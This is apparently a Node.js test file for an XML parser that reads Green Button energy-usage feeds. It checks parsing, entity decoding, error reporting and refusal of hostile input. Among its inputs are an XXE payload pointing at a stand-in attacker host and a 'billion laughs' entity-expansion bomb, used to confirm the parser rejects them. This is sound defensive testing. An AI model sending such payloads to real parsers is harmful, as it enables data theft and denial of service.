import { test } from 'node:test';
import assert from 'node:assert/strict';
import { DTD_MESSAGE, XmlRefusal, XmlSyntaxError, findAll, parseXml, readXml } from '../../../parsers/xml.mjs';

const espi = `<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:espi="http://naesb.org/espi">
  <!-- a comment -->
  <entry>
    <content>
      <espi:ReadingType><espi:uom>72</espi:uom><espi:powerOfTenMultiplier>3</espi:powerOfTenMultiplier></espi:ReadingType>
    </content>
  </entry>
  <entry>
    <content>
      <IntervalBlock xmlns="http://naesb.org/espi">
        <IntervalReading><timePeriod><duration>900</duration><start>1767225600</start></timePeriod><value>2</value></IntervalReading>
        <IntervalReading><timePeriod><duration>900</duration><start>1767226500</start></timePeriod><value>3</value></IntervalReading>
      </IntervalBlock>
    </content>
  </entry>
</feed>`;

test('reads an ESPI-shaped feed into a tree with local names', () => {
  const root = parseXml(espi);
  assert.equal(root.local, 'feed');
  assert.equal(findAll(root, 'uom')[0].text, '72');
  assert.equal(findAll(root, 'uom')[0].name, 'espi:uom');
  assert.deepEqual(findAll(root, 'value').map((n) => n.text), ['2', '3']);
  assert.equal(root.attrs['xmlns:espi'], 'http://naesb.org/espi');
});

test('decodes the five predefined entities, character references, and CDATA', () => {
  const root = parseXml('<a t="x &amp; y &#x3C;">&lt;b&gt; &quot;&apos; &#169;<![CDATA[<raw & text>]]></a>');
  assert.equal(root.attrs.t, 'x & y <');
  assert.equal(root.text, '<b> "\' ©<raw & text>');
});

test('a quoted ">" inside an attribute does not end the tag', () => {
  assert.equal(parseXml('<a note="1 > 0"/>').attrs.note, '1 > 0');
});

test('refuses an external entity as a whole file and makes no request', () => {
  const original = globalThis.fetch;
  let fetched = 0;
  globalThis.fetch = () => { fetched++; throw new Error('no network'); };
  try {
    const xxe = '<?xml version="1.0"?>\n<!DOCTYPE feed [<!ENTITY xxe SYSTEM "http://attacker.example/steal">]>\n<feed>&xxe;</feed>';
    assert.throws(() => parseXml(xxe), (e) => e instanceof XmlRefusal && e.code === 'dtd' && e.message === DTD_MESSAGE);
    assert.equal(fetched, 0);
  } finally {
    globalThis.fetch = original;
  }
});

test('refuses entity-expansion bombs before expanding anything', () => {
  const bomb = '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>';
  assert.throws(() => parseXml(bomb), XmlRefusal);
});

test('refuses an undeclared entity reference', () => {
  assert.throws(() => parseXml('<a>&nbsp;</a>'), (e) => e instanceof XmlRefusal && e.code === 'entity');
});

test('the refusal message says Green Button files never need a DTD and asks for a fresh export', () => {
  assert.match(DTD_MESSAGE, /Green Button files never need one/);
  assert.match(DTD_MESSAGE, /fresh export/);
});

test('reports broken files with a line number', () => {
  const cases = ['<a><b></a>', '<a>', 'text<a/>', '<a/><b/>', '<a x="1" x="2"/>', '<a>&</a>', '<!-- open <a/>', '', '<a>&#0;</a>'];
  for (const c of cases) assert.throws(() => parseXml(c), XmlSyntaxError, JSON.stringify(c));
  assert.throws(() => parseXml('<a>\n<b>\n</a>'), (e) => e.line === 3);
});

test('refuses absurd nesting depth', () => {
  assert.throws(() => parseXml('<a>'.repeat(300) + '</a>'.repeat(300)), /nested too deeply/);
});

test('emits events in document order', () => {
  const seen = [];
  readXml('<a><b k="v">t</b><c/></a>', {
    open: (n, at) => seen.push(`open ${n} ${JSON.stringify(at)}`),
    close: (n) => seen.push(`close ${n}`),
    text: (t) => seen.push(`text ${t}`),
  });
  assert.deepEqual(seen, ['open a {}', 'open b {"k":"v"}', 'text t', 'close b', 'open c {}', 'close c', 'close a']);
});
